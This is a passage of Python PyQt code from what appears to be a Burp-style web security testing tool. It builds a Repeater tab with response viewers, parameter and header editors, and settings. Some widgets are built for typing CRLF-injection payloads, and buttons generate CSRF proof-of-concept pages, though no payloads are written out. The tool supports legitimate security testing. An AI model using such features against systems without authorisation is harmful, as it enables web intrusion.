                    if ok and term and not editor.find(term):
                        QMessageBox.information(tab,"Search",f'"{term}" not found')
                elif act == a_to_dec:
                    txt = editor.toPlainText().strip()
                    if txt:
                        self.tabs.setCurrentIndex(5)
                        try: self.dec_in.setPlainText(txt)
                        except Exception: pass
                elif act == a_to_intr:
                    hds2,bdy2 = self._parse_raw_request(_get_raw())
                    self.intr_url.setText(_get_full_url())
                    self.intr_method.setCurrentText(method_box.currentText())
                    self.intr_headers.setPlainText(
                        "\n".join(f"{k}: {v}" for k,v in hds2.items()))
                    self.intr_body.setPlainText((bdy2 or b"").decode("utf-8","replace"))
                    self.tabs.setCurrentIndex(3)
                elif act == a_render: resp_tabs.setCurrentIndex(5)
                elif act == a_csrf_r:
                    self._show_csrf_poc_dialog(self._gen_csrf_poc(_get_raw(), _get_full_url()))
                elif act == a_sel_all: editor.selectAll()
            editor.customContextMenuRequested.connect(_ctx)

        for _ed in _resp_editors:
            _install_resp_ctx(_ed)

        resp_wrap_btn.toggled.connect(_toggle_resp_wrap)
        resp_copy_btn.clicked.connect(_copy_resp)
        resp_url_btn.clicked.connect(lambda: QApplication.clipboard().setText(_get_full_url()))
        resp_save_btn.clicked.connect(_save_resp)
        resp_more_btn.clicked.connect(_resp_more_menu)

        # ── Populate response views ───────────────────────────────────────
        def _populate_resp(sc, resp_obj, rb, elapsed):
            try:    vs = f"HTTP/{resp_obj.raw.version/10:.1f}"
            except: vs = "HTTP/1.1"
            resp_badge.setText(f"{sc}  {elapsed*1000:.0f}ms  {len(rb):,}B")
            sc_col = status_color(sc)
            resp_badge.setStyleSheet(
                f"color:{sc_col};font-size:10px;font-family:{T.MONO};font-weight:700;")
            # Derive all text views from rb (the bytes we actually decided to
            # keep — decoded or raw-compressed per "Unpack compressed
            # responses") instead of resp_obj.text/.json(), which would
            # re-read an already-consumed stream when that setting is off.
            body_text = rb.decode(resp_obj.encoding or 'utf-8', 'replace')[:300_000]
            raw_out = f"{vs} {sc} {resp_obj.reason}\n"
            for k2,v2 in resp_obj.headers.items(): raw_out += f"{k2}: {v2}\n"
            raw_out += f"\n{body_text}"
            raw_resp.setPlainText(raw_out)
            hdrs_resp.setPlainText(
                "\n".join(f"{k2}: {v2}" for k2,v2 in resp_obj.headers.items()))
            body_resp.setPlainText(body_text)
            try:
                pretty_resp.setPlainText(
                    json.dumps(json.loads(body_text), indent=2, ensure_ascii=False))
            except Exception:
                try:
                    import xml.dom.minidom as _md
                    pretty_resp.setPlainText(_md.parseString(rb).toprettyxml(indent="  "))
                except Exception:
                    pretty_resp.setPlainText(body_text)
            data = rb[:32768]; hl = []
            for i2 in range(0, len(data), 16):
                ch = data[i2:i2+16]
                hp = " ".join(f"{b6:02x}" for b6 in ch).ljust(47)
                ap = "".join(chr(b6) if 32<=b6<127 else "." for b6 in ch)
                hl.append(f"{i2:08x}  {hp}  |{ap}|")
            hex_resp.setPlainText("\n".join(hl) or "(no body)")
            ct = resp_obj.headers.get("Content-Type","").lower()
            if "html" in ct:   render_view.setHtml(body_text[:500_000])
            elif "json" in ct:
                try: render_view.setPlainText(
                        json.dumps(json.loads(body_text), indent=2, ensure_ascii=False))
                except: render_view.setPlainText(body_text[:500_000])
            else: render_view.setPlainText(body_text[:300_000])
            _set_count_resp_header(_set_resp_headers(list(resp_obj.headers.items())))

        # ══ INSPECTOR / NOTES / CUSTOM ACTIONS (Burp-style side rail) ══
        _syncing = {"on": False}   # re-entrancy guard: table edit → raw text → table refresh

        def _get_path_only() -> str:
            raw = _get_raw(); first = raw.split('\n')[0] if raw else ''
            parts = first.split(' ')
            full_path = parts[1] if len(parts) >= 2 else '/'
            return full_path.split('?', 1)[0]

        def _get_query_pairs():
            raw = _get_raw(); first = raw.split('\n')[0] if raw else ''
            parts = first.split(' ')
            path = parts[1] if len(parts) >= 2 else '/'
            return parse_qsl(urlparse(path).query, keep_blank_values=True)

        def _set_query_pairs(pairs):
            lines = _get_raw().split('\n')
            if not lines: return
            parts = lines[0].split(' ', 2)
            m0 = parts[0] if parts else 'GET'
            old_path = parts[1] if len(parts) > 1 else '/'
            v0 = parts[2] if len(parts) > 2 else 'HTTP/1.1'
            new_q = urlencode(pairs)
            new_path = old_path.split('?', 1)[0] + (('?' + new_q) if new_q else '')
            lines[0] = f"{m0} {new_path} {v0}"
            _set_raw('\n'.join(lines))

        def _get_body_pairs():
            hds, bdy = self._parse_raw_request(_get_raw())
            ct = next((v2 for k2, v2 in hds.items() if k2.lower() == 'content-type'), '')
            if 'application/x-www-form-urlencoded' not in ct.lower():
                return []
            return parse_qsl((bdy or b'').decode('utf-8', 'replace'), keep_blank_values=True)

        def _set_body_pairs(pairs):
            new_body = urlencode(pairs)
            lines = _get_raw().split('\n')
            blank = next((i for i, l in enumerate(lines) if i > 0 and not l.strip()), len(lines))
            _set_raw('\n'.join(lines[:blank + 1]) + new_body)
            if _state["settings"].get("update_cl", True):
                _set_raw(_compute_cl_raw())

        def _get_cookie_pairs():
            hds, _ = self._parse_raw_request(_get_raw())
            cookie_val = next((v2 for k2, v2 in hds.items() if k2.lower() == 'cookie'), '')
            pairs = []
            for part in cookie_val.split(';'):
                part = part.strip()
                if not part: continue
                n2, _eq, v2 = part.partition('=')
                pairs.append((n2.strip(), v2.strip()))
            return pairs

        def _set_cookie_pairs(pairs):
            new_val = '; '.join(f"{k2}={v2}" for k2, v2 in pairs if k2)
            lines = _get_raw().split('\n')
            blank = next((i for i, l in enumerate(lines) if i > 0 and not l.strip()), len(lines))
            found = False
            for i in range(1, blank):
                if lines[i].lower().startswith('cookie:'):
                    if new_val: lines[i] = f"Cookie: {new_val}"
                    else: lines.pop(i); blank -= 1
                    found = True
                    break
            if not found and new_val:
                lines.insert(blank, f"Cookie: {new_val}")
            _set_raw('\n'.join(lines))

        def _get_header_pairs():
            hds, _ = self._parse_raw_request(_get_raw())
            return list(hds.items())

        def _set_header_pairs(pairs):
            lines = _get_raw().split('\n')
            blank = next((i for i, l in enumerate(lines) if i > 0 and not l.strip()), len(lines))
            first_line = lines[0] if lines else ''
            tail = lines[blank:]
            new_lines = [first_line] + [f"{k2}: {v2}" for k2, v2 in pairs if k2] + tail
            _set_raw('\n'.join(new_lines))

        class _CrlfLineEdit(QLineEdit):
            """QLineEdit where Shift+Enter inserts a literal \\r\\n instead of
            committing/closing the field — lets a header-folding / CRLF
            injection payload be typed directly, e.g. 'Var' + Shift+Enter
            becomes 'Var\\r\\n' as literal text. Plain Enter still commits,
            same as a normal QLineEdit."""
            def keyPressEvent(self, event):
                if (event.key() in (Qt.Key.Key_Return, Qt.Key.Key_Enter)
                        and event.modifiers() & Qt.KeyboardModifier.ShiftModifier):
                    self.insert("\\r\\n")
                    return
                super().keyPressEvent(event)

        class _CrlfValueDelegate(QStyledItemDelegate):
            """In-place cell editor for a table's Value column, giving it
            the same Shift+Enter -> literal \\r\\n behavior as the add-row
            field so existing rows can be edited the same way."""
            def createEditor(self, parent, option, index):
                return _CrlfLineEdit(parent)

        class _CrlfTextEdit(QPlainTextEdit):
            """Multi-line counterpart to _CrlfLineEdit, for the taller
            stacked Name:/Value: header-add form (matches Burp's layout).
            Plain Enter submits (via `submitted`) instead of inserting a
            real newline; Shift+Enter inserts the literal \\r\\n text."""
            submitted = pyqtSignal()

            def keyPressEvent(self, event):
                if event.key() in (Qt.Key.Key_Return, Qt.Key.Key_Enter):
                    if event.modifiers() & Qt.KeyboardModifier.ShiftModifier:
                        self.insertPlainText("\\r\\n")
                    else:
                        self.submitted.emit()
                    return
                super().keyPressEvent(event)

        def _make_param_editor(get_pairs, set_pairs, name_ph="Name", value_ph="Value",
                                crlf_in_value=False):
            """Name/Value table + inline add-row form, wired bidirectionally
            to get_pairs()/set_pairs(pairs) — mirrors Burp Inspector's
            query/body/cookie/header sections."""
            container = QWidget()
            cv = QVBoxLayout(container); cv.setContentsMargins(8, 6, 8, 6); cv.setSpacing(6)

            table = QTableWidget(0, 2)
            table.setHorizontalHeaderLabels(["Name", "Value"])
            table.horizontalHeader().setStretchLastSection(True)
            table.verticalHeader().setVisible(False)
            table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
            table.setFont(mono_font(10))
            table.setStyleSheet(
                f"QTableWidget{{background:{T.SURFACE};color:{T.CODE};gridline-color:{T.BORDER};"
                f"border:1px solid {T.BORDER};border-radius:6px;font-family:{T.MONO};font-size:10px;}}"
                f"QHeaderView::section{{background:{T.PANEL};color:{T.TXT3};border:none;"
                f"border-bottom:1px solid {T.BORDER};padding:3px 6px;font-size:9px;font-weight:700;}}"
                f"QTableWidget::item{{padding:3px;}}"
                f"QTableWidget::item:selected{{background:{T.GLOW};color:{T.TXT1};}}")
            table.setMaximumHeight(130)
            if crlf_in_value:
                table.setItemDelegateForColumn(1, _CrlfValueDelegate(table))

            empty_lbl = QLabel("It's empty in here")
            empty_lbl.setAlignment(Qt.AlignmentFlag.AlignCenter)
            empty_lbl.setStyleSheet(f"color:{T.TXT3};font-size:11px;padding:12px;")

            cv.addWidget(table); cv.addWidget(empty_lbl)

            name_edit = QLineEdit(); name_edit.setPlaceholderText(name_ph); name_edit.setFixedHeight(24)
            name_edit.setStyleSheet(
                f"background:{T.BG};color:{T.CODE};border:1px solid {T.BORDER};"
                f"border-radius:5px;padding:2px 6px;font-size:10px;font-family:{T.MONO};")

            if crlf_in_value:
                # Burp-style stacked form: "Name:" + field, "Value:" + a
                # taller multi-line field (room for \r\n insertions to
                # actually be visible), Cancel/Add underneath.
                value_edit = _CrlfTextEdit()
                value_edit.setPlaceholderText(value_ph)
                value_edit.setFixedHeight(52)
                value_edit.setToolTip("Shift+Enter inserts a literal \\r\\n (header-folding / CRLF-injection payloads)")
                value_edit.setStyleSheet(
                    f"background:{T.BG};color:{T.CODE};border:1px solid {T.BORDER};"
                    f"border-radius:5px;padding:4px 6px;font-size:10px;font-family:{T.MONO};")

                cancel_row_btn = QPushButton("Cancel"); cancel_row_btn.setFixedHeight(24)
                cancel_row_btn.setStyleSheet(
                    f"background:{T.SURFACE};color:{T.TXT2};border:1px solid {T.BORDER};"
                    f"border-radius:5px;font-size:10px;padding:0 10px;")
                add_row_btn = QPushButton("Add"); add_row_btn.setStyleSheet(primary_btn_css()); add_row_btn.setFixedHeight(24)

                name_lbl = QLabel("Name:"); value_lbl = QLabel("Value:")
                for _l in (name_lbl, value_lbl):
                    _l.setStyleSheet(f"color:{T.TXT3};font-size:10px;font-weight:600;")

                form_col = QVBoxLayout(); form_col.setSpacing(4)
                form_col.addWidget(name_lbl); form_col.addWidget(name_edit)
                form_col.addWidget(value_lbl); form_col.addWidget(value_edit)
                btn_row = QHBoxLayout(); btn_row.addStretch()
                btn_row.addWidget(cancel_row_btn); btn_row.addWidget(add_row_btn)
                form_col.addLayout(btn_row)
                cv.addLayout(form_col)

                def _add_row():
                    n2 = name_edit.text().strip()
                    if not n2: return
                    _syncing["on"] = True
                    try: set_pairs(get_pairs() + [(n2, value_edit.toPlainText())])
                    finally: _syncing["on"] = False
                    name_edit.clear(); value_edit.clear(); _refresh()
                add_row_btn.clicked.connect(_add_row)
                value_edit.submitted.connect(_add_row)
                cancel_row_btn.clicked.connect(lambda: (name_edit.clear(), value_edit.clear()))
            else:
                value_edit = QLineEdit(); value_edit.setPlaceholderText(value_ph); value_edit.setFixedHeight(24)
                value_edit.setStyleSheet(
                    f"background:{T.BG};color:{T.CODE};border:1px solid {T.BORDER};"
                    f"border-radius:5px;padding:2px 6px;font-size:10px;font-family:{T.MONO};")
                add_row_btn = QPushButton("Add"); add_row_btn.setStyleSheet(primary_btn_css()); add_row_btn.setFixedHeight(24)
                form_row = QHBoxLayout()
                form_row.addWidget(name_edit, 1); form_row.addWidget(value_edit, 1); form_row.addWidget(add_row_btn)
                cv.addLayout(form_row)

                def _add_row():
                    n2 = name_edit.text().strip()
                    if not n2: return
                    _syncing["on"] = True
                    try: set_pairs(get_pairs() + [(n2, value_edit.text())])
                    finally: _syncing["on"] = False
                    name_edit.clear(); value_edit.clear(); _refresh()
                add_row_btn.clicked.connect(_add_row)
                value_edit.returnPressed.connect(_add_row)

            def _refresh():
                pairs = get_pairs()
                table.blockSignals(True)
                table.setRowCount(len(pairs))
                for i, (k2, v2) in enumerate(pairs):
                    table.setItem(i, 0, QTableWidgetItem(k2))
                    table.setItem(i, 1, QTableWidgetItem(v2))
                table.blockSignals(False)
                table.setVisible(bool(pairs)); empty_lbl.setVisible(not pairs)
                return len(pairs)

            def _on_cell_changed(_row, _col):
                if _syncing["on"]: return
                pairs = []
                for r in range(table.rowCount()):
                    ni = table.item(r, 0); vi = table.item(r, 1)
                    pairs.append((ni.text() if ni else "", vi.text() if vi else ""))
                _syncing["on"] = True
                try: set_pairs(pairs)
                finally: _syncing["on"] = False
            table.cellChanged.connect(_on_cell_changed)

            table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
            def _tbl_ctx(pos):
                if table.rowCount() == 0: return
                m2 = QMenu(table)
                a_rm = m2.addAction("Remove row")
                act = m2.exec(table.mapToGlobal(pos))
                if act == a_rm:
                    row = table.currentRow()
                    pairs = get_pairs()
                    if 0 <= row < len(pairs):
                        del pairs[row]
                        _syncing["on"] = True
                        try: set_pairs(pairs)
                        finally: _syncing["on"] = False
                        _refresh()
            table.customContextMenuRequested.connect(_tbl_ctx)

            return container, _refresh

        # ── Request attributes ──────────────────────────────────────────
        attr_w = QWidget(); attr_l = QFormLayout(attr_w)
        attr_l.setContentsMargins(10, 8, 10, 8); attr_l.setSpacing(6)
        attr_proto_combo = _SegToggle([("HTTP/1.1", "HTTP/1"), ("HTTP/2", "HTTP/2")])
        attr_proto_combo.setFixedHeight(26)
        attr_proto_combo.setToolTip(
            "HTTP/2 lifts the ALPN restriction that normally forces HTTP/1.1\n"
            "on the wire (falls back to HTTP/1.1 automatically if the server\n"
            "doesn't support h2). Mirrors the version selector in the toolbar.")
        attr_method_lbl = QLabel(method_box.currentText())
        attr_method_lbl.setStyleSheet(f"color:{T.TXT2};font-family:{T.MONO};font-size:11px;")
        attr_path_edit = QLineEdit()
        attr_path_edit.setToolTip("Path only — query string lives in 'Request query parameters' below")
        attr_path_edit.setStyleSheet(
            f"background:{T.SURFACE};color:{T.CODE};border:1px solid {T.BORDER};"
            f"border-radius:5px;padding:3px 6px;font-family:{T.MONO};font-size:11px;")
        for _lbl_txt, _wgt in (("Protocol:", attr_proto_combo), ("Method:", attr_method_lbl),
                                ("Path:", attr_path_edit)):
            _fl = QLabel(_lbl_txt); _fl.setStyleSheet(f"color:{T.TXT3};font-size:11px;")
            attr_l.addRow(_fl, _wgt)

        def _path_edited():
            lines = _get_raw().split('\n')
            if not lines: return
            parts = lines[0].split(' ', 2)
            m0 = parts[0] if parts else 'GET'
            old_path = parts[1] if len(parts) > 1 else '/'
            q0 = old_path.split('?', 1)[1] if '?' in old_path else ''
            v0 = parts[2] if len(parts) > 2 else 'HTTP/1.1'
            new_path = attr_path_edit.text() + (('?' + q0) if q0 else '')
            lines[0] = f"{m0} {new_path} {v0}"
            _set_raw('\n'.join(lines))
        attr_path_edit.editingFinished.connect(_path_edited)

        def _apply_http_version(new_ver, source):
            """Keep the Protocol control (Request attributes), the raw
            request line, and the ALPN-override setting all in sync."""
            if _syncing["on"]:
                return
            _syncing["on"] = True
            try:
                if source != 'inspector':
                    attr_proto_combo.blockSignals(True); attr_proto_combo.setCurrentText(new_ver); attr_proto_combo.blockSignals(False)
                lines = _get_raw().split('\n')
                if lines:
                    parts = lines[0].split(' ', 2)
                    m0 = parts[0] if parts else method_box.currentText()
                    p0 = parts[1] if len(parts) > 1 else '/'
                    lines[0] = f"{m0} {p0} {new_ver}"
                    _set_raw('\n'.join(lines))
                # HTTP/2 needs the ALPN restriction lifted to have any chance
                # of actually negotiating h2 with the origin; HTTP/1.x wants
                # it forced so a server that also offers h2 doesn't upgrade
                # out from under a deliberately-crafted HTTP/1.x request.
                _state["settings"]["allow_alpn_override"] = (new_ver == "HTTP/2")
            finally:
                _syncing["on"] = False

        attr_proto_combo.currentTextChanged.connect(lambda v: _apply_http_version(v, 'inspector'))

        attrs_box, _ = self._make_collapsible("Request attributes", attr_w, expanded=True, icon="🔖")

        query_editor, _refresh_query = _make_param_editor(_get_query_pairs, _set_query_pairs)
        query_box, _set_count_query = self._make_collapsible(
            "Request query parameters", query_editor, expanded=True, icon="🔍")

        body_editor, _refresh_body = _make_param_editor(_get_body_pairs, _set_body_pairs)
        body_box, _set_count_body = self._make_collapsible(
            "Request body parameters", body_editor, expanded=False, icon="📦")

        cookie_editor, _refresh_cookie = _make_param_editor(_get_cookie_pairs, _set_cookie_pairs)
        cookie_box, _set_count_cookie = self._make_collapsible(
            "Request cookies", cookie_editor, expanded=False, icon="🍪")

        header_editor, _refresh_header = _make_param_editor(
            _get_header_pairs, _set_header_pairs, crlf_in_value=True)
        header_box, _set_count_header = self._make_collapsible(
            "Request headers", header_editor, expanded=False, icon="📑")

        # ── Response headers — read-only, populated once a response arrives.
        # Burp's own Inspector shows this alongside the request sections
        # (same panel, same scroll), not tucked away under the response
        # pane — this was missing entirely before.
        resp_headers_tbl = QTableWidget(0, 2)
        resp_headers_tbl.setHorizontalHeaderLabels(["Name", "Value"])
        resp_headers_tbl.horizontalHeader().setStretchLastSection(True)
        resp_headers_tbl.verticalHeader().setVisible(False)
        resp_headers_tbl.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        resp_headers_tbl.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        resp_headers_tbl.setFont(mono_font(10))
        resp_headers_tbl.setStyleSheet(
            f"QTableWidget{{background:{T.SURFACE};color:{T.CODE};gridline-color:{T.BORDER};"
            f"border:1px solid {T.BORDER};border-radius:6px;font-family:{T.MONO};font-size:10px;}}"
            f"QHeaderView::section{{background:{T.PANEL};color:{T.TXT3};border:none;"
            f"border-bottom:1px solid {T.BORDER};padding:3px 6px;font-size:9px;font-weight:700;}}"
            f"QTableWidget::item{{padding:3px;}}"
            f"QTableWidget::item:selected{{background:{T.GLOW};color:{T.TXT1};}}")
        resp_headers_tbl.setMaximumHeight(160)
        resp_headers_empty = QLabel("Send a request to see response headers")
        resp_headers_empty.setAlignment(Qt.AlignmentFlag.AlignCenter)
        resp_headers_empty.setStyleSheet(f"color:{T.TXT3};font-size:11px;padding:12px;")
        resp_headers_wrap = QWidget()
        _rhw = QVBoxLayout(resp_headers_wrap); _rhw.setContentsMargins(8, 6, 8, 6); _rhw.setSpacing(6)
        _rhw.addWidget(resp_headers_tbl); _rhw.addWidget(resp_headers_empty)
        resp_headers_tbl.setVisible(False)

        def _set_resp_headers(pairs):
            resp_headers_tbl.setRowCount(0)
            resp_headers_tbl.setVisible(bool(pairs))
            resp_headers_empty.setVisible(not pairs)
            for k3, v3 in pairs:
                r = resp_headers_tbl.rowCount(); resp_headers_tbl.insertRow(r)
                resp_headers_tbl.setItem(r, 0, QTableWidgetItem(k3))
                resp_headers_tbl.setItem(r, 1, QTableWidgetItem(v3))
            return len(pairs)

        resp_header_box, _set_count_resp_header = self._make_collapsible(
            "Response headers", resp_headers_wrap, expanded=False, icon="📥")

        insp_inner = QWidget()
        insp_v = QVBoxLayout(insp_inner); insp_v.setContentsMargins(0, 0, 0, 0); insp_v.setSpacing(0)
        for _bx in (attrs_box, query_box, body_box, cookie_box, header_box, resp_header_box):
            insp_v.addWidget(_bx)
        insp_v.addStretch()

        insp_scroll = QScrollArea(); insp_scroll.setWidgetResizable(True)
        insp_scroll.setStyleSheet(f"QScrollArea{{background:{T.BG};border:none;}}")
        insp_scroll.setWidget(insp_inner)
        insp_page = QWidget()
        _ipv = QVBoxLayout(insp_page); _ipv.setContentsMargins(0, 0, 0, 0); _ipv.addWidget(insp_scroll)

        def _refresh_inspector():
            if _syncing["on"]: return
            if not attr_path_edit.hasFocus():
                attr_path_edit.blockSignals(True)
                attr_path_edit.setText(_get_path_only())
                attr_path_edit.blockSignals(False)
            attr_method_lbl.setText(method_box.currentText())
            if not attr_proto_combo.hasFocus():
                attr_proto_combo.blockSignals(True)
                _first_line = _get_raw().split('\n', 1)[0]
                _ver_tok = _first_line.split(' ', 2)[2] if _first_line.count(' ') >= 2 else 'HTTP/1.1'
                attr_proto_combo.setCurrentText(_ver_tok)
                attr_proto_combo.blockSignals(False)
            _set_count_query(_refresh_query())
            _set_count_body(_refresh_body())
            _set_count_cookie(_refresh_cookie())
            _set_count_header(_refresh_header())

        req_editor.textChanged.connect(_refresh_inspector)
        _refresh_inspector()

        # ── Notes page (per-tab scratch notes, not persisted to disk) ─────
        notes_page = QPlainTextEdit()
        notes_page.setPlaceholderText("Notes for this request… (kept for this session only)")
        notes_page.setStyleSheet(
            f"background:{T.BG};color:{T.CODE};border:none;padding:10px;font-size:12px;")

        # ── Custom actions page — quick one-click helpers ──────────────────
        ca_page = QWidget()
        ca_v = QVBoxLayout(ca_page); ca_v.setContentsMargins(10, 10, 10, 10); ca_v.setSpacing(6)
        ca_v.addWidget(self._intr_section_label("Quick actions"))

        def _ca_btn(label):
            b = QPushButton(label); b.setFixedHeight(30)
            b.setStyleSheet(
                f"QPushButton{{background:{T.SURFACE};color:{T.TXT1};text-align:left;"
                f"border:1px solid {T.BORDER};border-radius:6px;padding:0 10px;font-size:11px;}}"
                f"QPushButton:hover{{border-color:{T.BLUE};}}")
            ca_v.addWidget(b)
            return b

        _ca_btn("📐  Recalculate Content-Length").clicked.connect(lambda: _recalc_cl())
        _ca_btn("✨  Beautify body (JSON / XML)").clicked.connect(lambda: _beautify())
        _ca_btn("🔗  Copy full URL").clicked.connect(
            lambda: QApplication.clipboard().setText(_get_full_url()))
        _ca_btn("⌨  Copy as cURL").clicked.connect(lambda: _copy_as_curl())
        _ca_btn("🍪  Remove all cookies").clicked.connect(lambda: _set_cookie_pairs([]))
        _ca_btn("🛡  Generate CSRF PoC").clicked.connect(
            lambda: self._show_csrf_poc_dialog(self._gen_csrf_poc(_get_raw(), _get_full_url())))
        ca_v.addStretch()

        # ── Icon rail (right edge, fixed width) ─────────────────────────
        side_stack = QStackedWidget()
        side_stack.addWidget(insp_page); side_stack.addWidget(notes_page); side_stack.addWidget(ca_page)

        rail = QWidget(); rail.setFixedWidth(58)
        rail.setStyleSheet(f"background:{T.PANEL};border-left:1px solid {T.BORDER};")
        rail_v = QVBoxLayout(rail); rail_v.setContentsMargins(4, 8, 4, 8); rail_v.setSpacing(4)

        def _rail_btn(txt, tip, caption):
            b = QToolButton()
            b.setIcon(_emoji_icon(txt, 20))
            b.setIconSize(QSize(20, 20))
            b.setText(caption)
            b.setToolButtonStyle(Qt.ToolButtonStyle.ToolButtonTextUnderIcon)
            b.setFixedSize(50, 46)
            b.setCheckable(True)
            b.setToolTip(tip)
            b.setStyleSheet(
                f"QToolButton{{background:transparent;color:{T.TXT3};border:none;"
                f"border-radius:6px;font-size:7pt;font-weight:600;padding-top:2px;}}"
                f"QToolButton:checked{{background:{T.BLUE};color:{T.ON_ACCENT};}}"
                f"QToolButton:hover:!checked{{background:{T.SURFACE};color:{T.TXT1};}}")
            return b

        rail_insp    = _rail_btn("📋", "Inspector", "INS")
        rail_notes   = _rail_btn("📝", "Notes", "NOTE")
        rail_actions = _rail_btn("⚡", "Custom actions", "ACT")
        rail_v.addWidget(rail_insp); rail_v.addWidget(rail_notes); rail_v.addWidget(rail_actions)
        rail_v.addStretch()
        rail_settings = _rail_btn("⚙", "Repeater settings for this tab", "SET")
        rail_v.addWidget(rail_settings)

        _rail_buttons = [rail_insp, rail_notes, rail_actions]

        def _select_rail(which_idx, btn):
            if btn.isChecked():
                for b2 in _rail_buttons:
                    if b2 is not btn: b2.setChecked(False)
                side_stack.setCurrentIndex(which_idx)
                side_stack.setVisible(True)
            elif not any(b2.isChecked() for b2 in _rail_buttons):
                side_stack.setVisible(False)

        rail_insp.toggled.connect(lambda c: _select_rail(0, rail_insp))
        rail_notes.toggled.connect(lambda c: _select_rail(1, rail_notes))
        rail_actions.toggled.connect(lambda c: _select_rail(2, rail_actions))
        rail_insp.setChecked(True)

        # ── "Repeater settings for this tab" popover ────────────────────
        SETTINGS_META = [
            ("update_cl", "Update Content-Length"),
            ("unpack_compressed", "Unpack compressed responses"),
            ("follow_redirects", "Follow redirections"),
            ("process_cookies_redirects", "Process cookies in redirections"),
            ("enforce_protocol_redirects", "Enforce protocol choice on cross-domain redirections"),
            ("normalize_line_endings", "Normalize HTTP/1 line endings"),
            ("http1_reuse", "Enable HTTP/1 connection reuse"),
            ("http2_reuse", "Enable HTTP/2 connection reuse"),
            ("strip_connection_h2", "Strip Connection header over HTTP/2"),
            ("allow_alpn_override", "Allow HTTP/2 ALPN override"),
        ]

        def _open_rep_settings_popover(anchor):
            dlg = QDialog(tab)
            dlg.setWindowFlags(Qt.WindowType.Popup)
            dlg.setStyleSheet(
                f"QDialog{{background:{T.PANEL};border:1px solid {T.BORDER};border-radius:10px;}}"
                f"QLabel{{color:{T.TXT1};}}"
                f"QCheckBox{{color:{T.TXT2};font-size:11px;padding:3px 0;}}")
            dv = QVBoxLayout(dlg); dv.setContentsMargins(14, 12, 14, 12); dv.setSpacing(4)

            title = QLabel("Repeater settings for this tab")
            title.setStyleSheet(f"color:{T.TXT1};font-size:12px;font-weight:700;")
            dv.addWidget(title); dv.addSpacing(6)

            restore_btn = QPushButton("Restore global defaults"); restore_btn.setFixedHeight(26)
            restore_btn.setStyleSheet(
                f"background:{T.SURFACE};color:{T.TXT1};border:1px solid {T.BORDER};"
                f"border-radius:6px;font-size:11px;")
            dv.addWidget(restore_btn); dv.addSpacing(6)

            cks = {}
            for key, label in SETTINGS_META:
                cb = QCheckBox(label)
                cb.setChecked(_state["settings"].get(key, False))
                def _mk(k2):
                    def _on(checked): _state["settings"][k2] = checked
                    return _on
                cb.toggled.connect(_mk(key))
                cks[key] = cb
                dv.addWidget(cb)

            dv.addSpacing(4)
            st_row = QHBoxLayout()
            st_lbl = QLabel("Streaming response timeout (s):")
            st_lbl.setStyleSheet(f"color:{T.TXT2};font-size:11px;")
            st_spin = QSpinBox(); st_spin.setRange(5, 300)
            st_spin.setValue(_state["settings"].get("streaming_timeout", 30))
            st_spin.valueChanged.connect(
                lambda val: _state["settings"].__setitem__("streaming_timeout", val))
            st_row.addWidget(st_lbl, 1); st_row.addWidget(st_spin)
            dv.addLayout(st_row)

            def _restore():
                _state["settings"] = dict(self.rep_global_settings)
                for key, _lb in SETTINGS_META:
                    cks[key].setChecked(_state["settings"].get(key, False))
                st_spin.setValue(_state["settings"].get("streaming_timeout", 30))
            restore_btn.clicked.connect(_restore)

            dlg.adjustSize()
            dlg.move(anchor.mapToGlobal(anchor.rect().bottomLeft()))
            dlg.exec()

        rail_settings.clicked.connect(lambda: _open_rep_settings_popover(rail_settings))
        settings_gear_btn.clicked.connect(lambda: _open_rep_settings_popover(settings_gear_btn))

        split.addWidget(side_stack)
        split.setSizes([430, 430, 260])
        content_row = QHBoxLayout(); content_row.setContentsMargins(0, 0, 0, 0); content_row.setSpacing(0)
        content_row.addWidget(split, 1)
        content_row.addWidget(rail)
        rv.addLayout(content_row, 1)

        # ══ HELPERS ══
        BODY_CAPABLE_METHODS = {"POST","PUT","PATCH","DELETE"}

        def _get_body_b() -> bytes:
            _, b2 = self._parse_raw_request(_get_raw()); return b2 or b""

        def _compute_cl_raw() -> str:
            bb = _get_body_b(); lines = _get_raw().split("\n")
            blank = next((i for i,l in enumerate(lines) if i>0 and not l.strip()), len(lines))
            found = False
            for i,l in enumerate(lines[:blank]):
                if l.lower().startswith("content-length"):
                    lines[i] = f"Content-Length: {len(bb)}"; found = True; break
            if not found and bb: lines.insert(blank, f"Content-Length: {len(bb)}")
            return "\n".join(lines)

        def _recalc_cl():
            _set_raw(_compute_cl_raw())

        def _insert_header(hdr_txt: str):
            lines = _get_raw().split("\n")
            blank = next((i for i,l in enumerate(lines) if i>0 and not l.strip()), len(lines))
            lines.insert(blank, hdr_txt); _set_raw("\n".join(lines))

        def _remove_header(name: str):
            lines = _get_raw().split("\n")
            blank = next((i for i,l in enumerate(lines) if i>0 and not l.strip()), len(lines))
            _set_raw("\n".join([l for i,l in enumerate(lines)
                                if not (0 < i < blank and l.lower().startswith(name.lower() + ":"))]))

        def _beautify():
            _, bdy = self._parse_raw_request(_get_raw())
            bstr = (bdy or b"").decode("utf-8","replace")
            try: pretty = json.dumps(json.loads(bstr), indent=2, ensure_ascii=False)
            except Exception:
                try:
                    import xml.dom.minidom as _md
                    pretty = _md.parseString(bstr.encode()).toprettyxml(indent="  ")
                except Exception: return
            lines = _get_raw().split("\n")
            blank = next((i for i,l in enumerate(lines) if i>0 and not l.strip()), len(lines))
            _set_raw("\n".join(lines[:blank+1]) + pretty)

        def _maybe_add_cl_zero(raw_text: str, new_method: str) -> str:
            if new_method not in BODY_CAPABLE_METHODS: return raw_text
            hds, bdy = self._parse_raw_request(raw_text)
            if bdy or any(k.lower()=='content-length' for k in hds): return raw_text
            lines = raw_text.split('\n')
            blank = next((i for i,l in enumerate(lines) if i>0 and not l.strip()), len(lines))
            lines.insert(blank,"Content-Length: 0")
            return '\n'.join(lines)

        # Method dropdown → sync first line
        def _sync_method(m2):
            lines = _get_raw().split('\n')
            if lines:
                parts = lines[0].split(' ', 2)
                p1 = parts[1] if len(parts)>1 else '/'; p2 = parts[2] if len(parts)>2 else 'HTTP/1.1'
                lines[0] = f"{m2} {p1} {p2}"
                _set_raw(_maybe_add_cl_zero('\n'.join(lines), m2))
        method_box.currentTextChanged.connect(_sync_method)

        # Toolbar actions
        rename_btn.clicked.connect(lambda: (
            lambda n,ok: self.rep_tabs.setTabText(
